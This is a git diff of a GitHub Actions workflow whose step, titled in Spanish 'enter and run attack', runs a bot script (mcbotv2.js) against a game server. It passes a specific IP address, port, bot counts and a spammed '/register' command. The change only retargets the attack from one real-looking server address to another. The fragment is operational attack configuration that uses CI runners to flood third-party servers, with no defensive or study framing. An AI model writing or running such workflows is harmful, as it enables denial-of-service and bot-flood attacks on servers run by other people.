@@ -46,7 +46,7 @@ jobs:
       - name: Entrar y ejecutar ataque
         run: |
           cd ssh2
-          timeout 25 node mcbotv2.js 45.126.208.51 25590 13444 15 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
+          timeout 25 node mcbotv2.js 131.196.198.112 25575 13444 15 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
           
       - name: Limpiar
         if: always()
